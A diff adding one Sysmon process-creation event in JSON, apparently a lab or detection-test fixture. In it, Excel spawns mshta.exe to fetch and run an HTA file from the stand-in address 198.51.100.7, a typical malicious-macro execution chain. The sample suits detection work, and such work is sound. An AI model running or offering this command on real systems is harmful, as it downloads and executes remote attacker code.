@@ -1,0 +1,12 @@
+{
+  "EventID": 1,
+  "Channel": "Microsoft-Windows-Sysmon/Operational",
+  "Computer": "WIN-LAB01",
+  "UtcTime": "2026-10-21 14:03:11.512",
+  "Image": "C:\\Windows\\System32\\mshta.exe",
+  "CommandLine": "mshta.exe http://198.51.100.7/update.hta",
+  "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+  "ParentCommandLine": "",
+  "User": "LAB\\analyst",
+  "IntegrityLevel": "Medium"
+}
